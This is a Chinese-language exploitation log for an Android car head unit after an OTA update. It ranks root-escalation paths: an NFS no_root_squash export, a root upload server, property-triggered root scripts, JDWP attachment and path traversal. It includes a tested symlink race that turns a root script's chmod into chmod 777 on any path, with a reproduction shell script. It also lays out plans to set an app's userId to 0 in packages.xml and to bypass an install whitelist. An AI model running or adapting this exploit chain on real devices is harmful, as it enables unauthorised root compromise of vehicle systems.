# Q07 车机 root 口子排查（2026-10-15，系统刚更新到 /8 之后）

背景：今天 OTA 更新后 `ro.debuggable` 由 1 变 0，`adb root` 失效、无 `su`，且不能刷回旧固件。
此文档记录**不依赖刷机**的提权面，按价值排序。设备：`192.168.137.167:5555`，shell uid=2000，SELinux **Permissive**（`getenforce` = Permissive，全系统无拦截）。

---

## 1. NFS 导出配置错误（`no_root_squash`）—— 最严重

```
/etc/exports
/share *(rw,no_root_squash,async,no_subtree_check)
/       *(ro,no_root_squash,async,no_subtree_check)
```

* `nfsserver`（root，`u:r:nfsserver:s0`）+ `rpcbind` 常驻，监听 `:2049` / `:111`。
* `no_root_squash` ⇒ **客户端的 root 在车机上就是 root**。
* 带来的能力：宿主机（以 root 挂载）可 **读整个导出**、并且对 `/share` **任意读写**（可 chmod）。
* 限制：
  * 需要客户端有 NFS 客户端且能以 root 挂载。本机 Windows 没有 NFS 客户端、当前 shell 非管理员装不了、也没装 WSL ⇒ 需要用户侧配合（装 WSL / 开启“NFS 服务” / 用一台 Linux 或已 root 的手机）。
  * `/` 导出未带 `crossmnt`，而 `/data`、`/system`、`/vendor`、`/product`、`/system_ext`、`/odm` 都是**独立挂载**，所以“`/` 只读导出”实际覆盖的是 **rootfs**（内容很少），**不含 `/data`、`/system`**。
  * `/share` 是独立分区（`/dev/block/sda14`），挂载参数含 **`nosuid`** ⇒ 放 setuid 二进制无效。
* `/share` 内容：`ACS/`、`fota/`、`nfs/`、`lost+found/`、`record.wav`、`rpcbind.sock`。

## 2. `gohttpserver` 以 root 运行在 `:8000`，且开启了上传/删除

```
service gohttpserver /system/bin/gohttpserver -r /data/sdrv_logs --port 8000 \
        --xheaders --delete --upload --title AndroidLogFile
    user root
    group shell
    seclabel u:r:shell:s0
```

* 实测（`adb forward` 后用 curl）：`POST /` 返回 `{"destination":"/data/sdrv_logs/xxx","success":true}`，即 **能以 root 身份在该目录写文件**；支持删除；也能列目录/下载。
* 限制：目标是写死的服务根目录 `/data/sdrv_logs`（0700 root:shell）。
  * `../` 穿越被规范化成 **301 跳转**拦住；
  * `filename` 里的路径被 `filepath.Base` 清洗（`../../..`、绝对路径都落到 `/data/sdrv_logs/<basename>`）。
* 结论：**root 文件写，但被限制在一个目录内**，需要与其它机制组合才有效。

## 3. `setprop` 触发的 root 服务（SELinux Permissive 下可直接触发）

所有 `on property:` 触发点里，可被我们直接使用的：

| 属性 | 动作 | 身份 |
|---|---|---|
| `sys.dev.collect=<任意值>` | `start devinfocollector` → `/vendor/bin/deviceinfo.sh` | **root** |
| `persist.log.start=1` | `start logcollector` | **root** |
| `sys.lpdumpd=start` | `start lpdumpd` | **root** |
| `persist.traced_perf.enable=1` | `start traced_perf` | root |

* `/vendor/bin/deviceinfo.sh`（root，按属性触发即可随时执行）：`mkdir -p /resources/sdrv_deviceinfo && chmod 777`，写 `input/meminfo/top/...`，最后 `echo 'w' / 'l' > /proc/sysrq-trigger`。
  ⇒ **可获得一个 root 创建的 0777 目录** `/resources/sdrv_deviceinfo`（`/resources` 是独立可写分区 `/dev/block/sda12`）。
* 目前没有在这些脚本里找到“可注入点”（无 `getprop` 参与命令构造，路径全是常量），所以还没有形成 RCE。
* 检查过所有 `.rc`：**没有 `working_directory` 设置**，也没有相对路径的 service 可执行文件（唯二两条例外是 `/system/bin/AkAutomotiveService`、`cavehicle-service`，都在只读分区）。

## 4. 以 root 身份运行、且带 AIDL 接口的原生服务（Permissive ⇒ 任何 uid 都能调用）

`service list` 中值得注意的（前面是 service 名，方括号是接口）：

```
1   DataCollect        [com.incall.data.IDataCollectService]
89  logcollector       [com.changan.logcollector.ILogCollector]
0   CaConfigManagerService [com.incall.configmanager.IConfigInteractive]
```

* 实现：
  * `data-collect-center`（root，`/system/bin/data-collect-center`，32 KB）仅是一个 binder 壳子，真正逻辑在 `/system/lib64/libdc/libdatacollectcenter.so`（3.2 MB，含 MQTT / CycloneDDS / 配置云端同步 / 任务执行）。
    字符串里有 `/data/datacollect/sdr/`、`/data/datacollect/sdr/etc/tempConfig_Cloud_Latest.txt`、
    `tempConfig_Subscribe_Latest.txt`、`base_opr_system.cpp`、`business_autofix.cpp`、
    `business_recordtask_canmsg.cpp`、`business_recordtask_pcap.cpp`、`business_fileuploadtask.cpp`。
    ⇒ 这是一个**由云端下发任务、以 root 执行采集/修复动作**的代理（`popen`/系统操作）。
  * `logcollector`（root，203 KB）使用 **`popen`**，配置 `/vendor/etc/logconfig.json`（只读，只有日志轮转参数，**不含命令**），日志落 `/sdcard/AdayoLogs/`、`/sdcard/log/AdayoLog/`。
* 待验证的关键问题：这些 root 服务的接口里，**参数是否会进入命令/路径**（若有 ⇒ 直接 root RCE）。
  需要反编译对应 AIDL（`IDataCollectService` 被 `/system/app/{IncallMicroWorld,AppMarket,EnergyManager,C3bSubmaster,CaHardwareDetectService}` 引用）。

## 5. `:9898` 厂商「文件互传 / 装应用」Web 服务：路径穿越可用，但无特权

* 页面/接口（来自其 `script.js`）：`GET /file/<path>` 列目录、`GET /down/<path>` 下载、`POST /upload`（字段 `path` 为目标目录、`files-<size>` 为文件）、`POST /action`、`POST /cmd`、`POST /url`。
* 实测 `path=../../../data/local/tmp` 会被拼成 `/storage/emulated/0/../../../data/local/tmp` 并被内核解析到真实 `/data/local/tmp` ⇒ **穿越成立**，但对 `/data/local/tmp`、`/data/anr`、`/data/tombstones`、`/system/build.prop` 全部 **EACCES**。
  ⇒ 该服务是**普通 App uid**（非 system、非 root），拿不到提权。
* `:10087` 是 `TooTallNate Java-WebSocket` 服务（未展开）。

## 6. JDWP：4 个「system uid + debuggable」系统 App（可 attach，暂未拿到代码执行）

```
com.incall.sdakeyservice      uid=1000(sharedUser=android.uid.system) DEBUGGABLE  pid 1474
com.incall.remotecontrol      uid=1000(...)                             DEBUGGABLE  pid 2623
com.incall.submasterservice   uid=1000(...)                             DEBUGGABLE  pid 11063
com.incall.SoaBridgeTransit   uid=1000(...)                             DEBUGGABLE  pid 1694
```

* `adb jdwp` 列出上述 4 个 pid；`adb forward tcp:8700 jdwp:<pid>` + `jdb`/自写 JDI 客户端**可以成功 attach**（能列线程、能收到 MethodEntry 与 Breakpoint 事件）。
* 但 **ART 的 JDWP 拒绝在事件暂停线程上调用方法**：`IncompatibleThreadStateException`（在 `android.os.Handler.dispatchMessage` 断点帧里执行 `Runtime.getRuntime().exec` 直接挂死）。
* `run-as` 对 uid=1000 的包被自身拦下：`run-as: package not an application`（普通 debuggable 包如 `com.quectel.cardiagnosis`/`com.changan.incalleventservice` 的 `run-as` **可用**）。
* 相关：已注册 instrumentation 有 `com.incall.apps.{bluetooth,clock,energy,scenebrain}/.test.JacocoInstrumentation`（**`com.incall.apps.energy` 是 uid=1000**）。
  ⇒ **`am instrument` 会把 instrumentation 的代码跑在“目标 App 的进程/uid”里**；若目标 App 是 debuggable 的 uid=1000 包，则等于拿到 **uid=1000 代码执行**（这是下一步最值得试的路线）。

## 7. 其它已确认无效/受阻的路

* 厂商 VPN/TUN 抓包：`ip rule` 里 vendor 规则 `9000: from all lookup main` 在 VPN 规则 `12000` **之前**，`table main` 已有 VLAN 路由 ⇒ 用户态 VPN 抓不到流量（需要 root）。
* 设备上的 `tcpdump` 无 `CAP_NET_RAW`，`adb root` 被 `ro.debuggable=0` 拦。
* `/data/system/packages.list` 为 `-rw-r----- system package_info`，shell 组不含 `package_info`，读不了。
* Android 侧只有 4 个 display（中控/副驾/800x480/virtual），HUD 由 Submaster(QNX) 渲染，无 `DISPLAY_TYPE_HUD`（见 `hud-architecture.md`）。

---

## 8. ✅ 已实测确认的「触发式 root 执行 + 任意路径 chmod 777」链

三个事实叠加，构成一条**不刷机、可重复**的 root 原语链（全部已实测）：

1. **`/dev/socket/property_service` 是 `srw-rw-rw-`（0666，异常）**，且 SELinux Permissive
   ⇒ 我们这条普通 shell（uid=2000）就能设置任意属性，init 的 `on property:` 触发点会照常执行。
2. `setprop sys.dev.collect 1` ⇒ init 以 **root** 执行 `/vendor/bin/deviceinfo.sh`（实测：生成了 `root:root 0777` 的 `/resources/sdrv_deviceinfo/`，`/resources` 是可写分区 `/dev/block/sda12`）。
3. 该 root 脚本里有：
   ```sh
   DEVINFO_LOG_PATH="/resources/sdrv_deviceinfo"
   mkdir ${DEVINFO_LOG_PATH}/${devicetime}      # devicetime=`date +%Y%m%d_%H%M%S`
   chmod 777 ${DEVINFO_LOG_PATH}/${devicetime}
   /system/bin/dumpsys input >${DEVINFO_LOG_PATH}/${devicetime}/input.txt
   chmod 666 ${DEVINFO_LOG_PATH}/${devicetime}/input.txt
   ```
   脚本用**设备时钟**算目录名（设备时区=UTC），而 `/resources/sdrv_deviceinfo` 是 **0777**（我们能自己往里面建条目）
   ⇒ **预埋一个同名的符号链接**，`mkdir` 失败后 `chmod 777` 会**跟随软链**，于是 root 帮我们 `chmod 777` 任意路径。

   **实测**：`/data/local/tmp/chmodtest` 由 `----------`(000) 变成 **`-rwxrwxrwx`(777)** ✓
   （把软链指向**目录**时，脚本还会以 root 在该目录里创建 `input.txt/meminfo.txt/top.txt/...`，均为 root:root 0666。）

### 由此得到的两条提权阶梯

* **A（要重启，最接近真 root）**：root `chmod 777 /data/system/packages.xml` ⇒ 我们即可读/改该文件 ⇒ 改自己 App 的 `userId`
  （先改 **1000** 验证，稳；再试 **0**）⇒ 重启后该 App 以 system/root 身份运行。
  * 风险：packages.xml 改坏可能起不来系统；对策：改前先备份（chmod 后可读）到 `/data/local/tmp` 与本地，必要时用 adb shell 还原（adbd 不依赖 PMS，仍可用；文件是 777，随时可写回）。
* **B（免重启，待找）**：用同一个 chmod 原语打开**某个 root 服务会实时读取的可写配置**，把命令塞进去 ⇒ 直接 root。
  目前查过 `data-collect-center` 的配置 `/system/etc/datacollect/tempConfig.txt`（513 KB）——内容是**CAN 信号采集策略**
  （`svc/mtd/mem/canID/starttask/endtask/canidlist`…），**不含命令字段** ✗；`logcollector` 的 `/vendor/etc/logconfig.json` 只有日志轮转参数 ✗。
  `/data/datacollect/sdr/etc/tempConfig_*.txt`（云端下发）仍值得看，但需先 chmod 打开。

### 复现脚本（设备端）

```sh
# 1) 预埋软链：把接下来 ~28 秒的“时间戳名”都指向目标文件
rm -f /data/local/tmp/target; touch /data/local/tmp/target; chmod 000 /data/local/tmp/target
now=$(date +%s); n=$((now-3))
while [ $n -le $((now+25)) ]; do
  T=$(date -d @$n +%Y%m%d_%H%M%S)
  ln -sf /data/local/tmp/target "/resources/sdrv_deviceinfo/$T"
  n=$((n+1))
done
# 2) 触发 root 脚本
setprop sys.dev.collect 1
# 3) 结果：ls -l /data/local/tmp/target -> -rwxrwxrwx
```

（`/resources/sdrv_deviceinfo` 需先由第 2 步创建一次；已确认存在。）

## 下一步候选（按性价比）

1. **instrumentation → uid=1000 代码执行**：复用已白名单可安装的包名（`com.changan.acscenter`，见 `install-bypass.md`）重打包一个声明 `instrumentation targetPackage="com.incall.sdakeyservice"`（或 submasterservice）的 APK，安装后 `am instrument -w` ⇒ 我们的代码在 **uid=1000** 进程里跑。之后
   * 检查 `/dev/socket/*` 里 `root:system` 且可写的 root 服务套接字（Permissive 下只剩 DAC 屏障）；
   * 或改 `/data/system/packages.xml`（`/data/system` 是 `drwxrwxr-x system system`，uid=1000 可写）里的 `userId` 再重启 → 真 root（有 bootloop 风险，需先备份）。
2. **反编译 `IDataCollectService` / `ILogCollector`**，找参数进入命令的地方（root RCE）。
3. **NFS 导出**：需要用户侧有 Linux/NFS 客户端（本机没管理员权限）。
4. 组合：**root 文件写（gohttpserver，限 `/data/sdrv_logs`）+ 触发式 root 脚本**，继续找可控输入。
